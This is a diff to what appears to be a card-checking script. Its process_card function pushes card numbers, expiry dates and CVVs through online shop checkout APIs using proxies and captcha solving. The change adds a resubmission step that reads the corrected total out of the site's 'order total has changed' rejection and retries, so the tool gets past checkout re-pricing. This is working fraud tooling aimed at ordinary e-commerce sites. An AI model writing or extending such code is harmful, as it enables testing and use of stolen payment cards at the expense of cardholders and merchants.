@@ -739,6 +739,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 _ma = ((_ml0.get('totalAmount') or {}).get('value') or {}).get('amount')
                 if _ma:
                     subtotal = str(_ma)
+                    # keep the payment base in sync with the session's current merch price
+                    running_total = str(_ma)
                 _ct = ((_bp.get('checkoutTotal') or {}).get('value') or {}).get('amount')
                 if _ct:
                     checkout_total = str(_ct)
@@ -929,7 +931,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 print(f"[S4DBG] sessDL: {_dl[:1]}", flush=True)
                 print(f"[S4DBG] sent: ship={shipping_amount} handle={delivery_strategy!r} stable={stableId!r} addr={street!r},{city!r},{state!r},{s_zip!r} sub={subtotal!r} rt={running_total!r}", flush=True)
             if "Your order total has changed." in text:
-                return False, "Site not supported", gateway, total_price, currency
+                # the session re-priced between proposal and submit; the rejection carries the
+                # updated totals — resubmit once with the corrected amount
+                _ckm = re.search(r'"checkoutTotal":\{"value":\{"amount":"([0-9.]+)"', text)
+                if _ckm:
+                    submit_variables['input']['payment']['paymentLines'][0]['amount']['value']['amount'] = _ckm.group(1)
+                    response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                        session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
+                    )
+                    if "Your order total has changed." in text:
+                        return False, "Site not supported", gateway, total_price, currency
+                else:
+                    return False, "Site not supported", gateway, total_price, currency
             if "The requested payment method is not available." in text:
                 return False, "Payment method not available", gateway, total_price, currency
             
